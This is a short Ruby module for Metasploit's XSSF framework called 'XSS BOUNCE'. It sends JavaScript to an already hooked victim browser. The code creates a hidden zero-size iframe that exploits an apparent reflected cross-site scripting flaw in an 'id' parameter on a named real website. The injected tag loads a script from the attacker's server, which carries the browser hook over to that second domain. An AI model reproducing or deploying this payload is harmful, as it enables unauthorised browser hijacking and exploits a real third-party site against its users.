require 'msf/core'
require 'msf/base/xssf'

#
# READ README FILE FOR MORE INFORMATION ABOUT MODULES
# Module permiting an XSS to bounce over an other XSS of other domain
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer

	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'XSS BOUNCE',
			'Description' => 'Simple XSSF bounce'
		))
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %{
			clearTimeout(victim_loop);		// Kills the first loop
			
			iframe = createCrossIframe("XSS_BOUNCE", 0, 0);
			iframe.src = 'http://www.gmvnl.com/newgmvn/sports/map.asp?id="<script type="text/javascript" src="' + SERVER + 'loop" ></script>'
			document.body.appendChild(iframe);	
		}
		send_response(cli, code)
	end
end